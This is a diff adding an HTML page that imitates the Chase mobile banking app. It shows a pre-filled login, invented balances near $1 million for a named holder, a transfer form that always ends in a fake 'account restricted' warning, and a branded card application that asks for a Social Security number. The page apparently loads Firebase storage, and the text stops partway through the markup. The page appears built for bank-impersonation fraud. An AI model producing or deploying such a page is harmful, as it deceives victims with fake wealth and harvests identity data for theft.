@@ -1,0 +1,1731 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chase Mobile Banking</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --chase-blue: #0b6efd;
+            --chase-dark: #0a4ec2;
+            --chase-light: #e6f0ff;
+            --bg-gray: #f4f4f4;
+            --text-dark: #1a1a1a;
+            --text-gray: #666;
+            --text-light: #999;
+            --border-gray: #e0e0e0;
+            --success: #28a745;
+            --error: #dc3545;
+            --warning: #ffc107;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #000;
+            color: var(--text-dark);
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        #app {
+            max-width: 414px;
+            margin: 0 auto;
+            background: var(--bg-gray);
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Login Screen */
+        .login-screen {
+            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.5) 100%), 
+                        url('https://images.unsplash.com/photo-1534430480872-3498386e7856?w=800&q=80') center/cover;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .login-header {
+            padding: 60px 20px 30px;
+            text-align: center;
+        }
+
+        .chase-logo {
+            font-size: 42px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .chase-logo::after {
+            content: '';
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            background: white;
+            border-radius: 50%;
+            margin-left: 8px;
+            position: relative;
+        }
+
+        .chase-logo::after {
+            content: '⬡';
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            background: white;
+            border-radius: 50%;
+            margin-left: 8px;
+            color: var(--chase-blue);
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .login-form-container {
+            background: white;
+            border-radius: 20px 20px 0 0;
+            padding: 30px 24px;
+            flex: 1;
+            margin-top: auto;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 0;
+            border: none;
+            border-bottom: 1px solid var(--border-gray);
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+            background: transparent;
+        }
+
+        .input-field:focus {
+            border-bottom-color: var(--chase-blue);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--text-gray);
+            padding: 10px;
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: var(--text-gray);
+        }
+
+        .checkbox-item input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            accent-color: var(--chase-blue);
+            cursor: pointer;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: var(--chase-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary:hover {
+            background: var(--chase-dark);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .login-links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .login-links a {
+            display: block;
+            color: var(--chase-blue);
+            text-decoration: none;
+            font-size: 14px;
+            margin: 12px 0;
+            font-weight: 500;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: var(--text-gray);
+            text-decoration: none;
+        }
+
+        /* Main App Layout */
+        .main-app {
+            display: none;
+            min-height: 100vh;
+            background: var(--bg-gray);
+        }
+
+        .app-header {
+            background: var(--chase-blue);
+            color: white;
+            padding: 50px 20px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .header-greeting {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 20px;
+        }
+
+        .header-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+
+        .quick-action-btn {
+            background: rgba(255,255,255,0.15);
+            border: none;
+            color: white;
+            padding: 12px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.3s;
+        }
+
+        .quick-action-btn:hover {
+            background: rgba(255,255,255,0.25);
+        }
+
+        .quick-action-btn i {
+            font-size: 20px;
+        }
+
+        /* Accounts Section */
+        .accounts-section {
+            padding: 20px;
+        }
+
+        .accounts-card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .accounts-header {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+        }
+
+        .account-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border-gray);
+            cursor: pointer;
+        }
+
+        .account-item:last-child {
+            border-bottom: none;
+        }
+
+        .account-info h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .account-number {
+            font-size: 13px;
+            color: var(--text-gray);
+            margin-top: 4px;
+        }
+
+        .account-balance {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .open-account-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--chase-blue);
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+
+        /* Offers Section */
+        .offers-section {
+            padding: 0 20px 20px;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .section-link {
+            color: var(--chase-blue);
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .offers-scroll {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding-bottom: 10px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .offer-card {
+            min-width: 100px;
+            height: 80px;
+            background: white;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .offer-card.office-depot {
+            background: #e31837;
+            color: white;
+        }
+
+        .offer-card.dell {
+            background: #007db8;
+            color: white;
+        }
+
+        /* Investment Section */
+        .investment-section {
+            padding: 20px;
+            background: white;
+            border-radius: 16px;
+            margin: 20px;
+        }
+
+        .investment-option {
+            margin-bottom: 20px;
+            padding: 15px;
+            border: 1px solid var(--border-gray);
+            border-radius: 8px;
+        }
+
+        .investment-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .investment-desc {
+            font-size: 14px;
+            color: var(--text-gray);
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 414px;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 0 20px;
+            border-top: 1px solid var(--border-gray);
+            z-index: 1000;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            color: var(--text-gray);
+            font-size: 11px;
+            transition: color 0.3s;
+        }
+
+        .nav-item.active {
+            color: var(--chase-blue);
+        }
+
+        .nav-item i {
+            font-size: 22px;
+        }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: flex-end;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 414px;
+            border-radius: 20px 20px 0 0;
+            max-height: 90vh;
+            overflow-y: auto;
+            transform: translateY(100%);
+            transition: transform 0.3s;
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid var(--border-gray);
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-gray);
+        }
+
+        /* Transfer Form */
+        .transfer-form {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--text-dark);
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-gray);
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-input:focus, .form-select:focus {
+            border-color: var(--chase-blue);
+        }
+
+        .amount-input {
+            position: relative;
+        }
+
+        .amount-input::before {
+            content: '$';
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: var(--text-gray);
+        }
+
+        .amount-input input {
+            padding-left: 28px;
+        }
+
+        /* Error Modal */
+        .error-modal {
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .error-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--warning);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 30px;
+        }
+
+        .error-code {
+            color: var(--text-gray);
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .error-message {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .phone-number {
+            color: var(--chase-blue);
+            font-weight: 600;
+            font-size: 18px;
+            margin: 15px 0;
+        }
+
+        /* Transactions */
+        .transactions-list {
+            padding: 20px;
+            background: white;
+            min-height: calc(100vh - 200px);
+        }
+
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border-gray);
+        }
+
+        .transaction-info {
+            flex: 1;
+        }
+
+        .transaction-name {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .transaction-date {
+            font-size: 12px;
+            color: var(--text-gray);
+        }
+
+        .transaction-amount {
+            text-align: right;
+        }
+
+        .transaction-amount.positive {
+            color: var(--success);
+        }
+
+        .transaction-amount.negative {
+            color: var(--text-dark);
+        }
+
+        .transaction-balance {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 2px;
+        }
+
+        /* Credit Card Application */
+        .card-options {
+            padding: 20px;
+        }
+
+        .card-option {
+            border: 2px solid var(--border-gray);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+        }
+
+        .card-option:hover, .card-option.selected {
+            border-color: var(--chase-blue);
+            background: var(--chase-light);
+        }
+
+        .card-name {
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .card-fee {
+            color: var(--text-gray);
+            font-size: 14px;
+        }
+
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-gray);
+            border-radius: 3px;
+        }
+
+        /* Utility Classes */
+        .hidden { display: none !important; }
+        .text-center { text-align: center; }
+        .mt-20 { margin-top: 20px; }
+        .mb-20 { margin-bottom: 20px; }
+
+        /* Cards Page */
+        .cards-page {
+            background: white;
+            min-height: calc(100vh - 80px);
+            padding: 20px;
+        }
+
+        .no-cards {
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .no-cards-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--bg-gray);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            color: var(--text-gray);
+        }
+
+        .no-cards h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .no-cards p {
+            color: var(--text-gray);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .btn-secondary {
+            background: var(--chase-blue);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .application-status {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .status-badge.under-review {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        /* Keyboard */
+        .keyboard {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 414px;
+            background: #d1d5db;
+            padding: 8px;
+            z-index: 2500;
+            display: none;
+        }
+
+        .keyboard.active {
+            display: block;
+        }
+
+        .keyboard-row {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 8px;
+        }
+
+        .key {
+            flex: 1;
+            max-width: 32px;
+            height: 42px;
+            background: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .key.wide {
+            max-width: 46px;
+        }
+
+        .key.space {
+            max-width: 180px;
+        }
+
+        .key:active {
+            background: #e5e7eb;
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <!-- Login Screen -->
+        <div class="login-screen" id="loginScreen">
+            <div class="login-header">
+                <div class="chase-logo">CHASE</div>
+            </div>
+            
+            <div class="login-form-container">
+                <div class="input-group">
+                    <input type="email" class="input-field" id="loginEmail" placeholder="User ID" value="kruegerchelsea1044@mail.com">
+                </div>
+                <div class="input-group password-container">
+                    <input type="password" class="input-field" id="loginPassword" placeholder="Password" value="••••••••••••">
+                    <span class="eye-icon" onclick="togglePassword()" style="font-size: 14px;">Show</span>
+                </div>
+                
+                <div class="checkbox-row">
+                    <label class="checkbox-item">
+                        <input type="checkbox" checked>
+                        <span>Remember me</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox">
+                        <span>Use token</span>
+                    </label>
+                </div>
+                
+                <button class="btn-primary" id="loginBtn" onclick="handleLogin()">
+                    <span id="loginBtnText">Sign in</span>
+                </button>
+                
+                <div class="login-links">
+                    <a href="#">Forgot user ID or Password?</a>
+                    <a href="#">Not enrolled? Sign up Now</a>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">Contact us</a>
+                    <a href="#">Privacy & security</a>
+                    <a href="#">Terms of use</a>
+                    <a href="#">Accessibility</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main App -->
+        <div class="main-app" id="mainApp">
+            <div class="app-header">
+                <div class="header-top">
+                    <div class="chase-logo" style="font-size: 24px;">CHASE</div>
+                    <div class="header-greeting">Hi, <span id="userName">Emmanuel Jobs</span></div>
+                    <div class="header-icons">
+                        <span class="header-icon" onclick="showToast('Notifications coming soon')">🔔</span>
+                        <span class="header-icon" style="background: rgba(255,255,255,0.2); width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 600;">E</span>
+                    </div>
+                </div>
+                <div class="quick-actions">
+                    <button class="quick-action-btn" onclick="showToast('Apple Pay setup coming soon')">
+                        <span>Set Up Apple Pay</span>
+                    </button>
+                    <button class="quick-action-btn" onclick="showErrorModal('Mobile check deposit is temporarily unavailable for your account. Please visit a Chase branch or ATM to deposit your check.')">
+                        <span>Deposit Checks</span>
+                    </button>
+                    <button class="quick-action-btn" onclick="openTransferModal()">
+                        <span>Account Transfer</span>
+                    </button>
+                    <button class="quick-action-btn" onclick="showToast('Bill pay coming soon')">
+                        <span>Pay a bill</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="content-area" id="contentArea">
+                <!-- Accounts View -->
+                <div class="accounts-view" id="accountsView">
+                    <div class="accounts-section">
+                        <div class="accounts-card">
+                            <h2 class="accounts-header">Accounts</h2>
+                            <div class="account-item" onclick="viewTransactions('checking')">
+                                <div class="account-info">
+                                    <h3>TOTAL CHECKING</h3>
+                                    <p class="account-number">** 7540</p>
+                                </div>
+                                <div class="account-balance" id="checkingBalance">$580,956.00</div>
+                            </div>
+                            <div class="account-item" onclick="viewTransactions('savings')">
+                                <div class="account-info">
+                                    <h3>CHASE SAVINGS</h3>
+                                    <p class="account-number">** 8745</p>
+                                </div>
+                                <div class="account-balance" id="savingsBalance">$467,778.00</div>
+                            </div>
+                            <div class="open-account-btn" onclick="switchTab('cards')">
+                                <span>+</span>
+                                <span>Open a Credit Card</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="offers-section">
+                        <div class="section-header">
+                            <div>
+                                <h3 class="section-title">Chase offers</h3>
+                                <p style="font-size: 13px; color: var(--text-gray);">Add deals, shop and get money back.</p>
+                            </div>
+                            <a href="#" class="section-link">All offers ></a>
+                        </div>
+                        <div class="offers-scroll">
+                            <div class="offer-card">Cards</div>
+                            <div class="offer-card office-depot">OFFICE DEPOT</div>
+                            <div class="offer-card" style="background: #1a1a1a; color: white;">BEATS</div>
+                            <div class="offer-card dell">DELL</div>
+                        </div>
+                    </div>
+
+                    <div style="padding: 0 20px 20px;">
+                        <h3 class="section-title" style="margin-bottom: 10px;">Invest with J.P. Morgan</h3>
+                        <p style="font-size: 13px; color: var(--text-gray);">Work with an advisor, invest online and access market insights ></p>
+                        <div class="investment-section">
+                            <div class="investment-option">
+                                <div class="investment-title">Wealth Management</div>
+                                <div class="investment-desc">Personalized investment strategies with dedicated advisors for high-net-worth individuals.</div>
+                            </div>
+                            <div class="investment-option">
+                                <div class="investment-title">Self-Directed Investing</div>
+                                <div class="investment-desc">Trade stocks, ETFs, and mutual funds with no commissions through our online platform.</div>
+                            </div>
+                            <div class="investment-option">
+                                <div class="investment-title">Retirement Planning</div>
+                                <div class="investment-desc">IRAs, 401(k) rollovers, and annuity options to secure your future.</div>
+                            </div>
+                            <div class="investment-option">
+                                <div class="investment-title">Sustainable Investing</div>
+                                <div class="investment-desc">ESG-focused portfolios that align with your values while pursuing returns.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Transactions View -->
+                <div class="transactions-view hidden" id="transactionsView">
+                    <div class="accounts-card" style="margin: 20px;">
+                        <div class="account-item" style="border-bottom: none;">
+                            <div class="account-info">
+                                <h3 id="transAccountName">TOTAL CHECKING</h3>
+                                <p class="account-number" id="transAccountNumber">** 7540</p>
+                            </div>
+                            <div class="account-balance" id="transBalance">$580,956.00</div>
+                        </div>
+                    </div>
+                    <h3 style="padding: 0 20px 10px; font-size: 16px;">Transaction History</h3>
+                    <div class="transactions-list" id="transactionsList">
+                        <!-- Transactions injected here -->
+                    </div>
+                </div>
+
+                <!-- Cards View -->
+                <div class="cards-view hidden" id="cardsView">
+                    <div class="cards-page">
+                        <div class="section-header" style="margin-bottom: 20px;">
+                            <h3 class="section-title">My Cards</h3>
+                            <button class="btn-secondary" style="padding: 10px 16px; font-size: 13px;" onclick="openCardApplication()">+ Apply for Card</button>
+                        </div>
+                        
+                        <div id="noCardsState">
+                            <div class="no-cards">
+                                <div class="no-cards-icon">Card</div>
+                                <h3>No cards yet</h3>
+                                <p>Apply for a Chase credit card to get started.</p>
+                                <button class="btn-secondary" onclick="openCardApplication()">Apply Now</button>
+                            </div>
+                        </div>
+
+                        <div id="applicationsList" class="hidden">
+                            <h4 style="margin-bottom: 15px; color: var(--text-gray); font-size: 14px;">Applications</h4>
+                            <!-- Applications injected here -->
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pay & Collect View -->
+                <div class="pay-view hidden" id="payView">
+                    <div style="padding: 20px;">
+                        <h2 style="margin-bottom: 20px;">Transfer Money</h2>
+                        <div class="accounts-card">
+                            <button class="btn-primary" onclick="openTransferModal()" style="margin-bottom: 15px;">New Transfer</button>
+                            <p style="color: var(--text-gray); font-size: 14px; text-align: center;">Quickly transfer between your accounts or to external accounts</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom Navigation -->
+            <div class="bottom-nav">
+                <div class="nav-item active" onclick="switchTab('accounts')">
+                    <span>Accounts</span>
+                </div>
+                <div class="nav-item" onclick="switchTab('pay')">
+                    <span>Pay & Collect</span>
+                </div>
+                <div class="nav-item" onclick="switchTab('transactions')">
+                    <span>Transactions</span>
+                </div>
+                <div class="nav-item" onclick="switchTab('cards')">
+                    <span>Cards</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Transfer Modal -->
+        <div class="modal-overlay" id="transferModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title">Transfer Money</h3>
+                    <button class="close-btn" onclick="closeModal('transferModal')">×</button>
+                </div>
+                <div class="transfer-form">
+                    <div class="form-group">
+                        <label class="form-label">From Account</label>
+                        <select class="form-select" id="fromAccount" onchange="updateAvailableBalance()">
+                            <option value="">Select source account</option>
+                            <option value="checking">TOTAL CHECKING - $580,956.00</option>
+                            <option value="savings">CHASE SAVINGS - $467,778.00</option>
+                        </select>
+                        <p style="font-size: 13px; color: var(--text-gray); margin-top: 5px;" id="availableBalance"></p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">To Account Number</label>
+                        <input type="text" class="form-input" id="toAccount" placeholder="Enter recipient account number" inputmode="none" onfocus="showKeyboard()">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Amount</label>
+                        <div class="amount-input">
+                            <input type="number" class="form-input" id="transferAmount" placeholder="0.00" inputmode="none" onfocus="showKeyboard()">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Description (Optional)</label>
+                        <input type="text" class="form-input" id="transferDesc" placeholder="What's this transfer for?" inputmode="none" onfocus="showKeyboard()">
+                    </div>
+                    
+                    <button class="btn-primary" id="transferBtn" onclick="processTransfer()">
+                        <span id="transferBtnText">Transfer →</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Error Modal -->
+        <div class="modal-overlay" id="errorModal">
+            <div class="modal-content" style="max-height: 70vh;">
+                <div class="error-modal">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 20px;">
+                        <div style="background: var(--chase-blue); color: white; padding: 15px; border-radius: 12px; display: flex; align-items: center; gap: 10px;">
+                            <span style="font-size: 24px;">🛡️</span>
+                            <span style="font-weight: 600;">CHASE</span>
+                        </div>
+                        <button class="close-btn" onclick="closeModal('errorModal')" style="position: absolute; right: 20px; top: 20px;">×</button>
+                    </div>
+                    <p class="error-code" id="errorCode">ERROR CODE: CH04957</p>
+                    <h3 class="error-title" id="errorTitle">Transfer Restricted</h3>
+                    <p class="error-message" id="errorMessage">
+                        Dear Emmanuel Jobs,<br><br>
+                        Your account has been temporarily restricted due to unusual activity detected from an unrecognized location. For your security, all outgoing transfers have been suspended. Please contact JPMorgan Chase support via secure message or call <span class="phone-number">1-800-935-9935</span> for immediate assistance.
+                    </p>
+                    <button class="btn-primary" onclick="closeModal('errorModal')" style="margin-bottom: 10px;">I Understand</button>
+                    <button class="btn-primary" style="background: white; color: var(--chase-blue); border: 1px solid var(--chase-blue);" onclick="showToast('Connecting to support...')">Contact Support</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Card Application Modal -->
+        <div class="modal-overlay" id="cardModal">
+            <div class="modal-content" style="max-height: 95vh;">
+                <div class="modal-header">
+                    <h3 class="modal-title" id="cardModalTitle">Credit Card Application</h3>
+                    <button class="close-btn" onclick="closeModal('cardModal')">×</button>
+                </div>
+                
+                <!-- Step 1: Choose Card -->
+                <div id="cardStep1" class="card-options">
+                    <p style="text-align: center; color: var(--text-gray); margin-bottom: 20px;">Select the Chase card that fits your lifestyle</p>
+                    
+                    <div class="card-option" onclick="selectCard('preferred', '$95/yr')">
+                        <div>
+                            <div class="card-name">Chase Sapphire Preferred®</div>
+                        </div>
+                        <div class="card-fee">$95/yr</div>
+                    </div>
+                    
+                    <div class="card-option selected" onclick="selectCard('reserve', '$550/yr')">
+                        <div>
+                            <div class="card-name">Chase Sapphire Reserve®</div>
+                        </div>
+                        <div class="card-fee">$550/yr</div>
+                    </div>
+                    
+                    <div class="card-option" onclick="selectCard('freedom-unlimited', '$0/yr')">
+                        <div>
+                            <div class="card-name">Chase Freedom Unlimited®</div>
+                        </div>
+                        <div class="card-fee">$0/yr</div>
+                    </div>
+                    
+                    <div class="card-option" onclick="selectCard('freedom-flex', '$0/yr')">
+                        <div>
+                            <div class="card-name">Chase Freedom Flex℠</div>
+                        </div>
+                        <div class="card-fee">$0/yr</div>
+                    </div>
+                    
+                    <button class="btn-primary" onclick="goToCardStep2()" style="margin-top: 20px;">Continue</button>
+                </div>
+
+                <!-- Step 2: Personal Info -->
+                <div id="cardStep2" class="hidden" style="padding: 20px;">
+                    <p style="color: var(--text-gray); font-size: 14px; margin-bottom: 20px;">Required for credit check verification</p>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Social Security Number (SSN)</label>
+                        <input type="password" class="form-input" id="ssnInput" placeholder="•••••••••" maxlength="9" inputmode="none" onfocus="showKeyboard()">
+                        <p style="font-size: 12px; color: var(--text-gray); margin-top: 5px;">Your SSN is encrypted and secure</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Annual Income</label>
+                        <div class="amount-input">
+                            <input type="number" class="form-input" id="incomeInput" placeholder="75,000" value="223333" inputmode="none" onfocus="showKeyboard()">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Employment Status</label>
+                        <select class="form-select" id="employmentStatus">
+                            <option value="">Select status</option>
+                            <option value="full-time">Employed Full-Time</option>
+                            <option value="part-time">Employed Part-Time</option>
+                            <option value="self-employed">Self-Employed</option>
+                            <option value="retired">Retired</option>
+                            <option value="student">Student</option>
+                            <option value="unemployed" selected>Unemployed</option>
+                            <option value="other">Other</option>
+                        </select>
+                    </div>
+                    
+                    <div style="display: flex; gap: 10px; margin-top: 30px;">
+                        <button class="btn-primary" style="flex: 1; background: white; color: var(--text-dark); border: 1px solid var(--border-gray);" onclick="goToCardStep1()">Back</button>
+                        <button class="btn-primary" style="flex: 1;" onclick="goToCardStep3()">Continue</button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Review -->
+                <div id="cardStep3" class="hidden" style="padding: 20px;">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <div style="width: 60px; height: 60px; background: var(--success); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: white; font-size: 30px;">✓</div>
+                        <h3>Review & Submit</h3>
+                        <p style="color: var(--text-gray); font-size: 14px;">Please review your application details</p>
+                    </div>
+                    
+                    <div style="background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                            <span style="color: var(--text-gray);">Card Type</span>
+                            <span style="font-weight: 600;" id="reviewCardType">Chase Sapphire Reserve®</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
